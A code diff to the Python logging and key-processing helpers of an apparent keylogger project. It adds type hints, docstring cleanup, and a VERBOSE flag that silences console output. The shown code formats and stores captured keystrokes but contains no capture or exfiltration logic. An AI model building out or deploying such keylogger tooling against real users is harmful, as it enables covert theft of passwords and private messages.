@@ -2,7 +2,7 @@ import os
 import re
 from datetime import datetime
 
-from constants import LOGS_DIR
+from constants import LOGS_DIR, VERBOSE
 from keylogger_utils import is_windows
 
 
@@ -11,11 +11,11 @@ def write_to_log(message: str, log_name: str) -> bool:
     Writes a message to a log file.
 
     Parameters:
-        - message: The message to be written to the log file.
-        - log_name: The name of the log file.
+        - message (str): The message to be written to the log file.
+        - log_name (str): The name of the log file.
 
     Returns:
-        - True if the message was successfully written to the log file, False otherwise.
+        - (bool): True if the message was successfully written to the log file, False otherwise.
     """
     try:
         log_path = os.path.join(LOGS_DIR, log_name)
@@ -34,7 +34,8 @@ def write_to_log(message: str, log_name: str) -> bool:
 
         if not os.path.exists(log_dir):
             os.makedirs(log_dir)
-            print("Directory {} created successfully!".format(log_dir))
+            if VERBOSE:
+                print("Directory {} created successfully!".format(log_dir))
 
         if not os.path.exists(log_path):
             with open(log_path, 'w') as f:
@@ -45,7 +46,8 @@ def write_to_log(message: str, log_name: str) -> bool:
 
         return True
     except Exception as e:
-        print(e)
+        if VERBOSE:
+            print(e)
         return False
 
 
@@ -57,7 +59,7 @@ def format_message(content: str) -> str:
         - content (str): The content of the message.
 
     Returns:
-        str: The formatted message with the current date and separator.
+        - (str): The formatted message with the current date and separator.
     """
     date = 'DATE: {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
     sep = '\n# ---------------------------------------------- #\n'
@@ -67,7 +69,7 @@ def format_message(content: str) -> str:
                                                 sep=sep)
 
 
-def process_keys(typed_keys):
+def process_keys(typed_keys: str) -> str:
     """
     Process the given string of typed keys and return a more legible version of it.
 
@@ -75,7 +77,7 @@ def process_keys(typed_keys):
         - typed_keys (str): A string representing the typed keys.
 
     Returns:
-        - str: A string representing the processed keys.
+        - (str): A string representing the processed keys.
     """
 
     processed_keys = re.sub(r'\[SPACE\]', ' ', typed_keys)
